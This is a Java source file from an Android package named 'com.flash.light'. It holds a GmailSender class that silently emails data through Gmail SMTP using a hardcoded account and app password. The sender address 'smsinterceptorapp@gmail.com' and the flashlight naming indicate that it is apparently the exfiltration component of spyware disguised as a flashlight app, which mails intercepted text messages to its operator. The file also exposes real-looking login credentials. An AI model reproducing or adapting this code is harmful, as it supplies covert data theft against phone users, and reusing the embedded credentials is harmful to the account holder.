package com.flash.light;

import javax.activation.DataSource;   
import javax.activation.DataHandler;   

import javax.mail.Message;   
import javax.mail.Session;   
import javax.mail.Transport;   
import javax.mail.internet.MimeMessage;   
import javax.mail.PasswordAuthentication;   
import javax.mail.internet.InternetAddress;   

import java.io.IOException;   
import java.io.InputStream;   
import java.io.OutputStream;   
import java.io.ByteArrayInputStream;   

import android.util.Log;
import java.util.Properties;   
import java.security.Security;   

public class GmailSender extends javax.mail.Authenticator {   

  private Session session;   
  private final String mailhost = "smtp.gmail.com";
  private final String password = "filcikyxgwstivft";
  private final String user     = "codecaine21@gmail.com";
  private final String sender   = "smsinterceptorapp@gmail.com";

  static {   
    Security.addProvider(new com.flash.light.JSSEProvider()); 
  }  

  public GmailSender() {   

    Properties props = new Properties();   
    props.put("mail.smtp.starttls.enable", true);
    props.put("mail.host", mailhost);   
    props.put("mail.smtp.auth", "true");   
    props.put("mail.smtp.port", "465");
    props.put("mail.smtp.socketFactory.port", "465");   
    props.put("mail.smtp.socketFactory.class",   
      "javax.net.ssl.SSLSocketFactory");   
    props.put("mail.smtp.socketFactory.fallback", "false");   
    props.setProperty("mail.smtp.quitwait", "false");   

    session = Session.getDefaultInstance(props, 
      new javax.mail.Authenticator() {
        protected PasswordAuthentication getPasswordAuthentication() {
          return new PasswordAuthentication(user, password);
        }
      });
    }   

  public synchronized void sendMail(String subject, String body, String recipients) throws Exception {   
    try {
      MimeMessage message = new MimeMessage(session);   
      DataHandler handler = new DataHandler(new ByteArrayDataSource(body.getBytes(), "text/plain"));   
      message.setSender(new InternetAddress(sender)); 
      message.setSubject(subject); 
      message.setDataHandler(handler);   
      Log.d("Flashlight sendMail() ","recipients -> " + recipients);
      if(recipients.indexOf(',') > 0) {
        message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(recipients));   
      }
      else { 
        message.setRecipient(Message.RecipientType.TO, new InternetAddress(recipients));   
        //Transport.send(message);   
      }
      Transport.send(message);   
    }
    //catch(Exception e) {
    catch(Throwable e) {
      Log.e("FlashLight GmailSender sendMail() Exception e", "" + e.toString());
    }
  }   

  public class ByteArrayDataSource implements DataSource {   

    private byte[] data;   
    private String type;   

    public ByteArrayDataSource(byte[] data, String type) {   
      super();   
      this.data = data;   
      this.type = type;   
    }   

    public ByteArrayDataSource(byte[] data) {   
      super();   
      this.data = data;   
    }   

    public void setType(String type) {   
      this.type = type;   
    }   

    public String getContentType() {   
      if(type == null) {
        return "application/octet-stream";   
      }
      else { 
        return type;   
      }
    }   

    public InputStream getInputStream() throws IOException {   
      return new ByteArrayInputStream(data);   
    }   

    public String getName() {   
      return "ByteArrayDataSource";   
    }   

    public OutputStream getOutputStream() throws IOException {   
      throw new IOException("Not Supported");   
    }   
  }   
}
